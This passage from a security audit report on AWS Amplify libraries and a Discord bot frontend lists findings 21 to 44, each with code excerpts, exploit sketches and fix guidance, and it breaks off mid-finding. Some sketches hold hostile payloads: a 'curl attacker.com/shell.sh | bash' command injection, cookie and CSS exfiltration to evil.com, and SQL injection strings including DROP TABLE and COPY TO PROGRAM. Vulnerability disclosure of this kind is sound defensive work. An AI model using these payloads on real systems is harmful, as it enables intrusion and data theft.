- If `headers.authorization` is present (any value, including empty string)
- `isIamAuthApplicableForRest` returns `false`
- Request sent via `unauthenticatedHandler` without SigV4 signature
- API Gateway may reject or handle the request differently

**Why it's real:** A developer setting custom headers that includes `authorization` (even accidentally) causes silent downgrade from IAM (SigV4) signing to unauthenticated requests. No warning or error is emitted.

**Fix guidance:**
- Warn when both `authorization` header and IAM signing are configured
- Or: Sign the request regardless, letting the server decide which auth to honor

---

### [FINDING 21]
**Title:** Hardcoded JWT Signing Secret in GraphiQL Explorer
**Severity:** Medium
**Reachable via GET?:** No (local tooling only)
**Endpoint(s):** Local GraphiQL explorer
**Inputs:** N/A

**Source:** `amplify-cli/packages/amplify-graphiql-explorer/src/utils/jwt.ts:9`
```typescript
const secret = new TextEncoder().encode('open-secrete');
const token = await new SignJWT(decodedToken as JWTPayload)
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret);
```

**Why it's real:** The hardcoded secret `'open-secrete'` (public source code) can be used to forge JWTs accepted by the local simulator. Combined with Finding 1, this normalizes insecure JWT practices.

**Fix guidance:**
- Generate random secrets at runtime
- Document that this is for local development only

---

### [FINDING 22]
**Title:** REST API URL Path Traversal via String Concatenation
**Severity:** Medium
**Reachable via GET?:** Yes (programmatic API calls)
**Endpoint(s):** All REST API calls from amplify-js
**Inputs:** API path parameter

**Source:** `amplify-js/packages/api-rest/src/utils/resolveApiUrl.ts:37-41`
```typescript
if (AmplifyUrl.canParse(urlStr + path)) {
  url = new AmplifyUrl(urlStr + path);  // Direct concatenation
} else {
  url = new AmplifyUrl(urlStr + path, location?.origin);
}
```

**Dataflow summary:**
- `urlStr` from config (e.g., `"https://api.example.com"`)
- `path` from developer/user code
- Direct string concatenation: `urlStr + path`
- If `path` starts with `//`, URL resolves to different host

**Exploit sketch:**
1. Config: `endpoint: "https://api.example.com"`
2. API call: `get({ apiName: 'myapi', path: '//evil.com/steal' })`
3. URL becomes: `https://api.example.com//evil.com/steal`
4. Browser may resolve `//evil.com` as protocol-relative URL
5. Request (with IAM credentials/signatures) sent to `evil.com`

**Why it's real:** Direct string concatenation without URL path sanitization. If `path` comes from user input or URL parameters, this enables SSRF with credentials.

**Fix guidance:**
- Ensure `path` starts with `/` and doesn't start with `//`
- Use URL API properly: `new URL(path, urlStr)`
- Validate path doesn't change the origin

---

### [FINDING 23]
**Title:** Cognito Endpoint Override Enables Credential Theft
**Severity:** Medium
**Reachable via GET?:** Yes (affects all auth API calls)
**Endpoint(s):** All Cognito service calls
**Inputs:** `userPoolEndpoint` configuration

**Source:** `amplify-js/packages/auth/src/providers/cognito/factories/createCognitoUserPoolEndpointResolver.ts:8-16`
```typescript
export const createCognitoUserPoolEndpointResolver =
  ({ endpointOverride }: { endpointOverride: string | undefined }) =>
  (input: EndpointResolverOptions): { url: URL } => {
    if (endpointOverride) {
      return { url: new AmplifyUrl(endpointOverride) };
    }
    return cognitoUserPoolEndpointResolver(input);
  };
```

**Sink:** All Cognito API calls (tokens sent in request body to this URL)

**Dataflow summary:**
- `userPoolEndpoint` accepted from Amplify configuration
- If set, ALL Cognito API calls (including token refresh with refresh tokens) go to this URL
- No validation that URL points to a legitimate AWS endpoint
- In SSR, configuration may be more dynamic (env vars)

**Why it's real:** No URL validation. A compromised or injected configuration could redirect all Cognito API calls (carrying valid tokens) to an attacker endpoint.

**Fix guidance:**
- Validate endpoint matches `*.amazonaws.com` or `*.amazoncognito.com`
- Warn when custom endpoints are configured

---

### [FINDING 24]
**Title:** postMessage Handler Without Origin Validation
**Severity:** Low
**Reachable via GET?:** Yes (any page embedding the docs component)
**Endpoint(s):** Client-side — docs components
**Inputs:** `window.postMessage` events

**Source:** `amplify-ui/docs/src/components/ExpoSnack.tsx:85-106`
```typescript
const listener = function ({ data }) {
  if (!Array.isArray(data)) return;
  const [eventName, { iframeId = null } = {}] = data;
  if (eventName === 'expoFrameLoaded' && iframeId === id.current) {
    ref.current.contentWindow.postMessage(
      ['expoDataEvent', { iframeId: id.current, code: code, ... }],
      '*'  // sends to ANY origin
    );
  }
};
window.addEventListener('message', listener);
```

**Why it's real:** No `event.origin` check on incoming messages and response sent to `'*'`. Code snippets could be exfiltrated by a malicious page.

**Fix guidance:**
- Check `event.origin` against expected origins
- Use specific target origin instead of `'*'`

---

### [FINDING 25]
**Title:** OpenSearch Sort Direction Injection in @searchable Resolver
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries)
**Endpoint(s):** AppSync GraphQL endpoints with @searchable
**Inputs:** Sort direction argument

**Source:** `amplify-category-api/packages/amplify-graphql-searchable-transformer/src/generate-resolver-vtl.ts:131-134`
```typescript
ifElse(
  ref('util.isNullOrEmpty($sortItem.direction)'),
  set(ref('sortDirection'), ref('util.toJson({"order": "desc"})')),
  set(ref('sortDirection'), ref('util.toJson({"order": $sortItem.direction})')),
),
```

**Sink:** OpenSearch sort query parameter

**Dataflow summary:**
- `$sortItem.direction` from GraphQL input
- Interpolated directly into JSON string: `{"order": $sortItem.direction}`
- Expected to be enum (`asc`/`desc`) but no VTL-level validation
- If enum constraint bypassed, arbitrary JSON injection

**Why it's real:** The value is interpolated into a JSON structure without quotes or escaping. While GraphQL enum types provide input validation, the VTL template itself performs no validation.

**Fix guidance:**
- Add VTL-level validation of direction value
- Wrap value in quotes: `{"order": "$sortItem.direction"}`

---

### [FINDING 26]
**Title:** SQL Injection in MySQL Schema Generator via Database Name Interpolation
**Severity:** High
**Reachable via GET?:** No (CLI-driven schema introspection)
**Endpoint(s):** `amplify api generate-schema` CLI command (connects to MySQL database)
**Inputs:** Database name from project configuration

**Source:** `amplify-category-api/packages/amplify-graphql-schema-generator/src/datasource-adapter/mysql-datasource-adapter.ts:105-123`
```typescript
export function getMySQLSchemaQuery(databaseName: string): string {
  return `
SELECT DISTINCT
  INFORMATION_SCHEMA.COLUMNS.TABLE_NAME,
  INFORMATION_SCHEMA.COLUMNS.COLUMN_NAME,
  ...
FROM INFORMATION_SCHEMA.COLUMNS
LEFT JOIN INFORMATION_SCHEMA.STATISTICS ON ...
WHERE INFORMATION_SCHEMA.COLUMNS.TABLE_SCHEMA = '${databaseName}'
`;
}
```

**Sink:** MySQL database query execution via the datasource adapter

**Dataflow summary:**
- `databaseName` parameter from project configuration
- Directly interpolated into SQL query string using template literal
- No parameterized query or escaping used
- Query executed against INFORMATION_SCHEMA

**Exploit sketch:**
1. Attacker controls database name in project config (e.g., via compromised amplify config or malicious project template)
2. Database name set to: `'; DROP TABLE users; --`
3. SQL query becomes: `WHERE TABLE_SCHEMA = ''; DROP TABLE users; --'`
4. Arbitrary SQL execution on the connected MySQL database

**Why it's real:** Direct string interpolation of `databaseName` into SQL at line 122. The `databaseName` comes from configuration which could be attacker-controlled in shared/template scenarios.

**Fix guidance:**
- Use parameterized queries with `?` placeholders
- Escape the database name using the MySQL client's escape function

---

### [FINDING 27]
**Title:** SQL Injection in PostgreSQL Schema Generator via Database Name Interpolation
**Severity:** High
**Reachable via GET?:** No (CLI-driven schema introspection)
**Endpoint(s):** `amplify api generate-schema` CLI command (connects to PostgreSQL database)
**Inputs:** Database name from project configuration

**Source:** `amplify-category-api/packages/amplify-graphql-schema-generator/src/datasource-adapter/pg-datasource-adapter.ts:107-133`
```typescript
export function getPostgresSchemaQuery(databaseName: string): string {
  return `
SELECT DISTINCT
  INFORMATION_SCHEMA.COLUMNS.table_name,
  ...
FROM INFORMATION_SCHEMA.COLUMNS
LEFT JOIN pg_indexes ON ...
WHERE INFORMATION_SCHEMA.COLUMNS.table_schema = 'public'
  AND INFORMATION_SCHEMA.COLUMNS.TABLE_CATALOG = '${databaseName}';
`;
}
```

**Sink:** PostgreSQL database query execution via the datasource adapter

**Dataflow summary:**
- Identical pattern to Finding 26 but for PostgreSQL
- `databaseName` interpolated into SQL at line 132
- No parameterized query or escaping

**Exploit sketch:**
1. Same as Finding 26 but targeting PostgreSQL
2. Database name: `'; SELECT pg_sleep(10); --` for time-based blind SQLi
3. Or: `'; COPY (SELECT '') TO PROGRAM 'whoami'; --` for RCE on PostgreSQL

**Why it's real:** Same string interpolation pattern as MySQL adapter. Line 132 directly injects `databaseName` into SQL.

**Fix guidance:**
- Use parameterized queries with `$1` placeholders
- Use `pg` client's parameterized query API

---

### [FINDING 28]
**Title:** Command Injection via --app CLI Option in `amplify init`
**Severity:** High
**Reachable via GET?:** No (CLI argument)
**Endpoint(s):** `amplify init --app <url>` CLI command
**Inputs:** `--app` CLI option value

**Source:** `amplify-cli/packages/amplify-cli/src/init-steps/preInitSetup.ts:24-27`
```typescript
const repoUrl = context.parameters.options.app;
```

**Sink:** `amplify-cli/packages/amplify-cli/src/init-steps/preInitSetup.ts:86,113`
```typescript
execSync(`git ls-remote ${repoUrl}`, { stdio: 'ignore' });  // Line 86
execSync(`git clone ${repoUrl} .`, { stdio: 'inherit' });    // Line 113
```

**Dataflow summary:**
- User provides `--app` parameter via CLI
- Value stored in `repoUrl` without any validation
- `repoUrl` interpolated directly into shell commands via `execSync`
- No shell escaping, no URL validation

**Exploit sketch:**
1. `amplify init --app "https://github.com/user/repo; curl attacker.com/shell.sh | bash"`
2. Shell interprets the `;` as command separator
3. Executes `git ls-remote https://github.com/user/repo` followed by `curl attacker.com/shell.sh | bash`
4. Attacker achieves remote code execution on the developer's machine

**Why it's real:** `execSync` with string interpolation is a classic command injection pattern. The `repoUrl` has zero sanitization between user input and shell execution.

**Fix guidance:**
- Use `execSync` with array form or `execFileSync` which avoids shell interpretation
- Validate URL format before passing to git commands
- Use `--` to separate git options from arguments: `git clone -- ${repoUrl}`

---

### [FINDING 29]
**Title:** Unsanitized Request Body Written Directly to DynamoDB in CRUD Lambda Template
**Severity:** High
**Reachable via GET?:** No (PUT/POST endpoints)
**Endpoint(s):** PUT and POST routes in generated CRUD Lambda functions
**Inputs:** `req.body` (HTTP request body)

**Source/Sink:** `amplify-cli/packages/amplify-nodejs-function-template-provider/resources/lambda/crud/app.js.ejs:161-178,184-201`
```javascript
// PUT handler (line 161-178)
app.put(path, async function(req, res) {
  if (userIdPresent) {
    req.body['userId'] = req.apiGateway.event.requestContext.identity.cognitoIdentityId || UNAUTH;
  }
  let putItemParams = {
    TableName: tableName,
    Item: req.body     // ENTIRE request body stored directly
  }
  let data = await ddbDocClient.send(new PutCommand(putItemParams));
});

// POST handler (line 184-201) — identical pattern
app.post(path, async function(req, res) {
  // ... same pattern: Item: req.body
});
```

**Dataflow summary:**
- HTTP request body is parsed by Express
- Entire `req.body` object used as DynamoDB Item without any filtering
- Attacker can inject arbitrary DynamoDB attributes
- No schema validation, no attribute whitelist

**Exploit sketch:**
1. API expects: `{ "title": "My Post", "content": "Hello" }`
2. Attacker sends: `{ "title": "My Post", "content": "Hello", "isAdmin": true, "role": "superadmin" }`
3. Extra attributes (`isAdmin`, `role`) stored in DynamoDB
4. If application reads these attributes later for authorization, privilege escalation achieved

**Why it's real:** This is a template that generates Lambda functions for Amplify projects. Every project using `amplify add api` with REST + DynamoDB gets this vulnerable pattern. The `req.body` is passed wholesale to DynamoDB's PutCommand.

**Fix guidance:**
- Validate and whitelist request body fields before storing
- Add schema validation middleware
- Only extract expected fields from req.body

---

### [FINDING 30]
**Title:** HTML Injection via Unsanitized Discord Message Content Mirrored to GitHub Discussions
**Severity:** High
**Reachable via GET?:** No (Discord message → GitHub API)
**Endpoint(s):** Discord `/admin` slash command that mirrors threads to GitHub Discussions
**Inputs:** Discord message content, attachment URLs, role names

**Source:** `discord-bot/apps/discord-bot-frontend/src/lib/discord/commands/admin.ts:95-112`
```typescript
async function createDiscussionBody(
  messages: Map<string, Message>,
  threadUrl: string
): Promise<string> {
  let body = ''
  for (const [, message] of messages) {
    const user = await getUser(message)
    body += `${user} ${formatContent(message.content)}\n\n`  // Unsanitized content
    if (message.attachments?.size) {
      message.attachments.forEach((attachment) => {
        body += `<img src="${attachment.attachment}" />\n\n`  // Unsanitized URL in img src
      })
    }
  }
  body += `#### 🕹️ View the original Discord thread [here](${threadUrl})\n`
  return body
}
```

**Additional sink at line 37-50:**
```typescript
const roleIcon = `<img src="${import.meta.env.VITE_HOST}/api/p/color/${color}.svg" ...`
userIdToUsername.set(`${userId}`, {
  highestRole: `(${role} ${roleIcon})`,  // role name unsanitized
})
return `<img src=${user?.avatar} width="30" /> **${user?.username}** ${user?.highestRole}: `
```

**Dataflow summary:**
- Discord message content (user-controlled) embedded into GitHub Discussion body
- Attachment URLs embedded directly into `<img src="">` HTML tags
- Discord role names embedded into HTML without escaping
- GitHub renders this HTML in Discussion pages

**Exploit sketch:**
1. Discord user crafts message: `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. Admin uses `/admin` command to mirror thread to GitHub
3. GitHub Discussion page renders the injected HTML
4. Stored XSS executes for anyone viewing the Discussion

**Why it's real:** Discord message content is directly interpolated into HTML that becomes a GitHub Discussion body. GitHub renders certain HTML in Discussion bodies. The `attachment.attachment` URL is placed in `<img src>` without any URL validation.

**Fix guidance:**
- HTML-escape all user content before embedding in Discussion body
- Validate attachment URLs against allowlisted domains
- Use markdown formatting instead of raw HTML

---

### [FINDING 31]
**Title:** GitHub API Path Injection via Unsanitized Username Parameter
**Severity:** Medium
**Reachable via GET?:** Yes (GET /api/github/[username])
**Endpoint(s):** GET /api/github/[username]
**Inputs:** URL path parameter `username`

**Source:** `discord-bot/apps/discord-bot-frontend/src/routes/api/github/[username]/+server.ts:4-11`
```typescript
export const GET: RequestHandler = async ({ params }) => {
  const octokit = await createOctokit()
  try {
    const { username } = params
    const { data } = await octokit.request(`GET /users/${username}`, {
      org: process.env.GITHUB_ORG_LOGIN,
    })
```

**Sink:** GitHub API request via Octokit with interpolated path

**Dataflow summary:**
- URL path parameter `username` extracted from SvelteKit route params
- Directly interpolated into Octokit API request path
- No validation of username format

**Exploit sketch:**
1. Request: `GET /api/github/../../repos/private-org/private-repo`
2. Octokit sends: `GET /users/../../repos/private-org/private-repo`
3. GitHub API may resolve path traversal to access different endpoints
4. Authenticated Octokit request may expose data from other API endpoints

**Why it's real:** The `username` parameter is directly interpolated into the API path. While Octokit may URL-encode some characters, path traversal with `../` could still redirect the API call.

**Fix guidance:**
- Validate username matches GitHub username pattern: `/^[a-z\d](?:[a-z\d]|-(?=[a-z\d])){0,38}$/i`
- Use Octokit's typed API methods instead of string interpolation

---

### [FINDING 32]
**Title:** javascript: URL Protocol Injection in useNavigateAction Hook
**Severity:** Medium
**Reachable via GET?:** Yes (client-side, triggered by user interaction with generated UI)
**Endpoint(s):** Client-side — Amplify Studio generated components
**Inputs:** `url` parameter passed to `useNavigateAction` hook

**Source:** `amplify-codegen-ui/packages/codegen-ui-react/lib/utils-file-functions/hooks/useNavigateAction.ts:16-22`
```typescript
export const useNavigateActionString = `export const useNavigateAction = (options) => {
  const { type, url, anchor, target } = options;
  const run = React.useMemo(() => {
    switch (type) {
      case 'url':
        return () => {
          window.open(url, target || '_self', 'noopener noreferrer');
        };
```

**Sink:** `window.open(url, ...)` with no URL protocol validation

**Dataflow summary:**
- `url` comes from component props (could be data-driven from CMS/API)
- Passed directly to `window.open()` without protocol validation
- `javascript:` URLs can execute arbitrary JavaScript

**Exploit sketch:**
1. Amplify Studio component has a navigation action bound to data from a CMS/API
2. Attacker injects: `javascript:alert(document.cookie)` as the URL value
3. When user clicks the component, `window.open('javascript:alert(document.cookie)', '_self')` executes
4. JavaScript execution in the context of the application

**Why it's real:** `window.open()` with `javascript:` protocol URLs is a known XSS vector. No protocol validation or allowlisting is performed on the `url` parameter.

**Fix guidance:**
- Validate URL protocol against allowlist: `['http:', 'https:', 'mailto:', 'tel:']`
- Reject `javascript:`, `data:`, `vbscript:` protocols

---

### [FINDING 33]
**Title:** CSS Injection via Theme dangerouslySetInnerHTML with Incomplete SSR Sanitization
**Severity:** Medium
**Reachable via GET?:** Yes (SSR-rendered pages with custom themes)
**Endpoint(s):** Any SSR-rendered page using Amplify UI ThemeProvider with custom theme
**Inputs:** Theme CSS text (from `createTheme()` output)

**Source:** `amplify-ui/packages/react/src/components/ThemeProvider/Style.tsx:56-65`
```typescript
if (cssText === undefined || /<\/style/i.test(cssText)) {
  return null;
}
return (
  <style
    {...rest}
    dangerouslySetInnerHTML={{ __html: cssText }}
  />
);
```

**Sink:** `dangerouslySetInnerHTML` on a `<style>` tag

**Dataflow summary:**
- `cssText` derived from theme configuration (potentially user-controlled in multi-tenant apps)
- The only sanitization is checking for `</style` tag to prevent breaking out of style context
- On SSR, CSS injection can be used for data exfiltration
- CSS `@import url()` can load external resources
- CSS attribute selectors can exfiltrate HTML attribute values

**Exploit sketch:**
1. Attacker controls theme token value in a multi-tenant application
2. Injects: `}  @import url('https://evil.com/track'); input[value^="password"] { background: url('https://evil.com/exfil?prefix=password') } .x {`
3. CSS loads external resource and exfiltrates input values via attribute selectors
4. No `</style` needed — attack works entirely within CSS context

**Why it's real:** The comment in the source code acknowledges the SSR vulnerability vector (lines 42-54) but the mitigation only prevents `</style>` tag injection. CSS-only attacks (data exfiltration via attribute selectors, external resource loading) are not mitigated.

**Fix guidance:**
- Sanitize CSS values within theme tokens, not just the aggregate CSS string
- Block `@import`, `url()`, and `expression()` in user-controlled theme values
- Use CSS custom properties (variables) instead of raw CSS injection

---

### [FINDING 34]
**Title:** Open Redirect via Unvalidated Guild Switch Redirect Parameter
**Severity:** Medium
**Reachable via GET?:** No (POST /api/switch-guild with formData)
**Endpoint(s):** POST /api/switch-guild
**Inputs:** `redirect` form data field

**Source:** `discord-bot/apps/discord-bot-frontend/src/routes/api/switch-guild/+server.ts:5-31`
```typescript
export const POST: RequestHandler = async ({ request, locals }) => {
  let guildId, redirect
  try {
    const data = await request.formData()
    guildId = data.get('guild') as string
    redirect = (data.get('redirect') as string) || '/'
  } catch (error) {
    return new Response('Invalid FormData', { status: 400 })
  }
  // ...
  headers.set('Location', redirect)  // No validation
  return new Response('ok', { headers, status: 307 })
}
```

**Sink:** HTTP `Location` header for 307 redirect

**Dataflow summary:**
- `redirect` extracted from POST form data
- Used directly as `Location` header value
- No validation that URL is relative or same-origin
- 307 redirect preserves POST method and body

**Exploit sketch:**
1. Craft form that POSTs to `/api/switch-guild` with: `guild=valid-id&redirect=https://evil.com/phish`
2. Server responds with `307 Redirect` to `https://evil.com/phish`
3. Browser follows redirect to attacker-controlled site
4. Can be used for phishing: "Your session expired, please re-enter your Discord token"

**Why it's real:** The `redirect` parameter is used directly as the `Location` header with zero validation. Standard open redirect vulnerability.

**Fix guidance:**
- Validate redirect URL is relative (starts with `/` and not `//`)
- Or validate against an allowlist of known paths
- Use `URL` API to verify same-origin

---

### [FINDING 35]
**Title:** Error Response Leaks Internal Stack Traces and Request Body in CRUD Lambda
**Severity:** Medium
**Reachable via GET?:** Yes (GET endpoints also have this pattern)
**Endpoint(s):** All CRUD Lambda error responses
**Inputs:** Any request that triggers a DynamoDB error

**Source:** `amplify-cli/packages/amplify-nodejs-function-template-provider/resources/lambda/crud/app.js.ejs:174-177,197-200`
```javascript
} catch (err) {
  res.statusCode = 500;
  res.json({ error: err, url: req.url, body: req.body });  // Leaks error object AND request body
}
```

**Sink:** HTTP response body

**Dataflow summary:**
- DynamoDB error object serialized to JSON response (may contain internal table names, ARNs, region)
- Full request body echoed back in error response
- Full request URL echoed back

**Why it's real:** The error response includes the raw DynamoDB error (which can contain table ARNs, IAM role information, and region details) plus the full request body (which may contain sensitive data from other users in batch operations).

**Fix guidance:**
- Return generic error messages to clients
- Log detailed errors server-side only
- Never echo request body in error responses

---

### [FINDING 36]
**Title:** DynamoDB Expression Injection via User-Controlled Attribute Names in Mutation Resolver
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL mutations)
**Endpoint(s):** AppSync GraphQL mutation endpoints for @model types
**Inputs:** GraphQL mutation input field names

**Source:** `amplify-category-api/packages/amplify-graphql-model-transformer/src/resolvers/dynamodb/mutation.ts:68-88`
```typescript
forEach(ref('entry'), ref('util.map.copyAndRemoveAllKeys($mergedValues, $keyFields).entrySet()'), [
  ifElse(
    raw('!$util.isNullOrEmpty($ctx.stash.metadata.dynamodbNameOverrideMap)...'),
    set(ref('entryKeyAttributeName'), raw('$ctx.stash.metadata.dynamodbNameOverrideMap.get("$entry.key")')),
    set(ref('entryKeyAttributeName'), raw('$entry.key')),
  ),
  // ...
  qref('$expNames.put("#$entryKeyAttributeName", "$entry.key")'),   // User input in expression
  qref('$expValues.put(":$entryKeyAttributeName", $util.dynamodb.toDynamoDB($entry.value))'),
]),
```

**Sink:** DynamoDB UpdateExpression via expression attribute names

**Dataflow summary:**
- GraphQL mutation input contains user-supplied field names
- Field names iterated and placed into DynamoDB expression attribute names mapping
- While ExpressionAttributeNames provides some protection, the VTL template uses string interpolation
- Special characters in field names could manipulate the expression

**Why it's real:** The VTL template uses `$entry.key` directly in string interpolation within the expression construction. While GraphQL type validation provides some protection, custom scalar types or lenient schemas could allow injection.

**Fix guidance:**
- Validate attribute names against allowlisted characters in VTL
- Use strict GraphQL input validation

---

### [FINDING 37]
**Title:** GUILD_COOKIE Set Without Secure Flag Enables Cookie Theft Over HTTP
**Severity:** Medium
**Reachable via GET?:** N/A (cookie attribute issue)
**Endpoint(s):** POST /api/switch-guild, handle-saved-guild hook
**Inputs:** N/A

**Source:** `discord-bot/apps/discord-bot-frontend/src/routes/api/switch-guild/+server.ts:22-27`
```typescript
cookie.serialize(GUILD_COOKIE, guildId, {
  path: '/',
  maxAge: 60 * 60 * 24 * 7,
  httpOnly: true,
  // Missing: secure: true
  // Missing: sameSite: 'strict' or 'lax'
})
```

**Also at:** `discord-bot/apps/discord-bot-frontend/src/lib/server/hooks/handle-saved-guild.ts:60-65`
```typescript
cookie.serialize(GUILD_COOKIE, activeGuild, {
  path: '/',
  maxAge: 60 * 60 * 24 * 7,
  // Missing: secure, httpOnly, sameSite
})
```

**Why it's real:** The GUILD_COOKIE is set without the `secure` flag, meaning it will be transmitted over unencrypted HTTP connections. The second instance at handle-saved-guild.ts also lacks `httpOnly`. Missing `sameSite` attribute makes the cookie susceptible to CSRF.

**Fix guidance:**
- Add `secure: true` to prevent transmission over HTTP
- Add `sameSite: 'lax'` or `'strict'` for CSRF protection
- Ensure `httpOnly: true` in all cookie serialization calls

---

### [FINDING 38]
**Title:** OpenSearch Aggregation Field Injection in @searchable Resolver
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries)
**Endpoint(s):** AppSync GraphQL endpoints with @searchable directive
**Inputs:** GraphQL aggregation arguments (field, name, type)

**Source:** `amplify-category-api/packages/amplify-graphql-searchable-transformer/src/generate-resolver-vtl.ts:208-214`
```typescript
set(ref('aggregation'), obj({
  ['']: raw(`"$agg.field"`),                  // User-controlled field name
  ['']: raw(`"$agg.type"`),                   // User-controlled aggregation type
  ['']: raw(`{\"field\": \"$agg.field\"}`),    // Field interpolated into JSON
})),
```

**Sink:** OpenSearch aggregation query

**Dataflow summary:**
- GraphQL aggregation arguments (`field`, `type`, `name`) from user input
- Directly interpolated into OpenSearch JSON query via VTL
- No validation of field names against schema
- Arbitrary aggregation types and field names accepted

**Exploit sketch:**
1. GraphQL query with aggregation: `searchPosts(aggregates: [{ field: "\", \"script\": { \"source\": \"_score\" }, \"x\": \"", type: "terms", name: "exploit" }])`
2. Field value breaks out of the JSON string and injects arbitrary OpenSearch query DSL
3. Could enumerate fields, extract data via scripted aggregations, or cause denial of service

**Why it's real:** The VTL template uses `$agg.field` directly in JSON string interpolation without escaping quotes or special characters.

**Fix guidance:**
- Validate field names against the model's schema fields
- Validate aggregation types against allowed values
- Escape JSON special characters in VTL

---

### [FINDING 39]
**Title:** Sensitive Error Details Exposed in GitHub Webhook Handler
**Severity:** Low
**Reachable via GET?:** No (POST webhook endpoint)
**Endpoint(s):** POST /api/webhooks/github-release
**Inputs:** Malformed webhook payloads

**Source:** `discord-bot/apps/discord-bot-frontend/src/routes/api/webhooks/github-release/+server.ts:29-35`
```typescript
} catch (error) {
  return json({
    errors: [{
      message: `Invalid payload: ${error.message}`,  // Error message from JSON.parse
    }],
  }, { status: 400 })
}
```

**Why it's real:** The `error.message` from `request.json()` parsing failure is included in the response. This can leak information about the server's JSON parser version and internal structure.

**Fix guidance:**
- Return generic error message: "Invalid JSON payload"
- Log detailed errors server-side

---

### [FINDING 40]
**Title:** Wildcard CORS on Admin Auth Lambda Enables Cross-Origin Admin Actions
**Severity:** Medium
**Reachable via GET?:** Yes (all admin API endpoints)
**Endpoint(s):** All routes on admin-auth-app (addUserToGroup, removeUserFromGroup, listUsers, etc.)
**Inputs:** N/A (configuration issue)

**Source:** `amplify-cli/packages/amplify-category-auth/resources/adminAuth/admin-auth-app.js:38-41`
```javascript
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});
```

**Why it's real:** The admin API that manages Cognito users (add/remove from groups, list users, confirm sign-ups, disable/enable users) uses `Access-Control-Allow-Origin: *`. Combined with Finding 3 (auth bypass via missing return), this allows any website to make cross-origin requests to the admin API.

**Fix guidance:**
- Set `Access-Control-Allow-Origin` to the specific admin dashboard origin
- Add `Access-Control-Allow-Credentials: true` only with specific origins

---

### [FINDING 41]
**Title:** Flawed HTTPS Enforcement Enables Open Redirect in OAuth Flow
**Severity:** Medium
**Reachable via GET?:** Yes (client-side auth flow)
**Endpoint(s):** OAuth authentication session redirect
**Inputs:** OAuth redirect URL

**Source:** `amplify-js/packages/auth/src/utils/openAuthSession.ts:6-12`
```typescript
export const openAuthSession: OpenAuthSession = async (url: string) => {
  if (!window?.location) {
    return;
  }
  // enforce HTTPS
  window.location.href = url.replace('http://', 'https://');
};
```

**Dataflow summary:**
- `url` is the OAuth redirect URL
- `String.replace` only replaces the FIRST occurrence of `http://`
- URL is then assigned to `window.location.href`
- No URL origin validation performed

**Exploit sketch:**
1. Craft OAuth redirect URL: `https://legitimate.com/callback?next=http://evil.com`
2. The `replace('http://', 'https://')` replaces the `http://` in the query parameter, not the scheme
3. Or craft: `http://evil.com/http://legitimate.com` → `https://evil.com/http://legitimate.com`
4. Browser navigates to attacker-controlled URL

**Why it's real:** Using `String.replace()` for security enforcement is fragile. It only replaces the first match and doesn't validate the URL's origin. The function's intent is to enforce HTTPS but it can be bypassed.

**Fix guidance:**
- Use `URL` API to properly parse and validate the URL
- Validate that the redirect URL matches expected origins
- Replace scheme using URL parser: `const u = new URL(url); u.protocol = 'https:';`

---

### [FINDING 42]
**Title:** User Input Reflected in Cognito Verification Page Without Encoding
**Severity:** Medium
**Reachable via GET?:** Yes (GET with base64 `data` query parameter)
**Endpoint(s):** Cognito custom message verification page
**Inputs:** `data` query parameter (base64-encoded JSON), `code` query parameter

**Source:** `amplify-cli/packages/amplify-category-auth/provider-utils/awscloudformation/triggers/CustomMessage/assets/verify.js:28-48`
```javascript
const urlParams = new URLSearchParams(window.location.search);
const encoded = urlParams.get('data');
const code = urlParams.get('code');
const decoded = JSON.parse(atob(encoded));
const { userName, redirectUrl, clientId, region } = decoded;

// ... Cognito confirmSignUp call ...

window.location.replace(redirectUrl);   // Open redirect - attacker controls redirectUrl
```

**Dataflow summary:**
- `data` query parameter is base64-decoded and JSON-parsed (line 31)
- `redirectUrl` extracted from the decoded object (line 32)
- After Cognito confirmation, browser redirected to `redirectUrl` (line 48)
- No validation of `redirectUrl` (protocol, origin, etc.)
- Also: `userName`, `clientId`, `region` from attacker-controlled base64 data used in Cognito API call

**Exploit sketch:**
1. Craft base64 payload: `btoa(JSON.stringify({userName:"victim", redirectUrl:"https://evil.com/phish", clientId:"legit-id", region:"us-east-1"}))`
2. Send link: `https://legitimate-domain.com/verify?data=<payload>&code=123456`
3. After Cognito action (or error), user redirected to `https://evil.com/phish`
4. Or: set `redirectUrl` to `javascript:alert(document.cookie)` for XSS

**Why it's real:** Already identified as Finding 8 (DOM-based open redirect), but this finding also covers the broader attack surface: the `userName`, `clientId`, and `region` values from attacker-controlled base64 data are used in the Cognito `confirmSignUp` API call. An attacker could target a different Cognito user pool or username by manipulating these values.

**Fix guidance:**
- Validate `redirectUrl` against allowlisted origins
- Validate `clientId` and `region` against expected values
- Use server-side verification instead of client-side

---

### [FINDING 43]
**Title:** Unvalidated Username in Cognito Admin API Calls Enables User Enumeration
**Severity:** Medium
**Reachable via GET?:** Yes (GET /getUser?username=...)
**Endpoint(s):** GET /getUser, GET /listGroupsForUser, POST /addUserToGroup, POST /removeUserFromGroup
**Inputs:** `username` query parameter or request body field

**Source:** `amplify-cli/packages/amplify-category-auth/resources/adminAuth/admin-auth-app.js:73-85`
```javascript
app.post('/addUserToGroup', async (req, res, next) => {
  if (!req.body.username || !req.body.groupname) {
    const err = new Error('username and groupname are required');
    err.statusCode = 400;
    return next(err);
  }
  try {
    const response = await addUserToGroup(req.body.username, req.body.groupname);
    res.status(200).json(response);
  } catch (err) {
    next(err);
  }
});
```

**Dataflow summary:**
- `username` taken directly from request query/body
- Passed to Cognito admin operations without format validation
- Error responses from Cognito may differ for existing vs. non-existing users
- Combined with Finding 3 (auth bypass), these endpoints are accessible without proper authorization

**Why it's real:** No username format validation. Combined with the auth bypass (Finding 3), any user can enumerate Cognito users, add/remove users from groups, enable/disable accounts, and confirm sign-ups.

**Fix guidance:**
- Validate username format before Cognito API calls
- Fix the auth bypass first (Finding 3)
- Return consistent error messages regardless of user existence

---

### [FINDING 44]
**Title:** Access Token JWT Verification Missing Issuer and Audience Checks
**Severity:** Medium
**Reachable via GET?:** No (POST /amplifyadmin/)
**Endpoint(s):** Admin login server token verification
**Inputs:** Access token from POST body

**Source:** `amplify-cli/packages/amplify-provider-awscloudformation/src/utils/admin-login-server.ts:141`
```typescript
